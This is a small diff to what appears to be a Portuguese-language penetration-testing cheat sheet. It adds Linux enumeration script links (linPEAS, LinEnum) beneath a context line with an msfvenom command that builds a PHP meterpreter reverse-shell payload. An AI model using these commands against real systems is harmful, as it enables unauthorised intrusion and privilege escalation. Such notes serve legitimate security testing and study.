@@ -148,6 +148,12 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Porta> -f raw -o shell
 set | grep TERM
 export TERM=xterm
 
+-- Extração de Informações
+
+LINUX
+https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
+https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
 
 
 
